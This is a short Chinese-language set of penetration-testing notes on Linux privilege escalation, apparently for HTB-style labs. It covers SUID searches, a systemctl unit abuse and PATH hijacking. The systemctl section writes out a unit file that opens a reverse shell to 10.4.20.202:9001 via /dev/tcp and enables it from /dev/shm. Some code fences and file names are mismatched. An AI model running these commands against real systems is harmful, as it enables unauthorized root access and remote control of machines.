## 提权

### Sudo
[[htb#Stocker]]



* SUID

* ```shell
  find / -type f -perm -04000 -ls 2>/dev/null
  ```python

  * systemctl

    ```shell
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/bash -c "/bin/bash -i > /dev/tcp/10.4.20.202/9001 0>&1 2<&1"
    [Install]
    WantedBy=multi-user.target' > /dev/shm/mm.service
    
    #生成一个unit名为mm.service,放在/dev/shm 下
    ```

    ```bash
    systemctl link /dev/shm/mm.service
    systemctl enable --now /dev/shm/mm.service
    ```

    > 通常unit存放在`/usr/lib/systemd/system/` 和 `/etc/systemd/system/，可以被systemctl加载执行，但是渗透过程中需要提权的场景往往权限较小，这些目录不可写。而systemctl的特性决定了，当unit在/tmp目录下时，无法被systemctl加载。这里需要掌握一个神奇的目录：/dev/shm/,关于这个目录的解读可以移步：https://www.cnblogs.com/tinywan/p/10550356.html学习掌握。这里就可以把我们生`成的unit文件放置再这个目录

    

​		

* 环境变量

  ```shell
  #查找可写文件夹
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  ```

  ```shell
  export PATH=/tmp:$PATH
  ```

  ```shell
  #新建一个shell
  echo "/bin/bash" >thm
  chmod 777 thm
  ./path
  ```

* NFS(网络文件共享)

  查看 /etc/exports

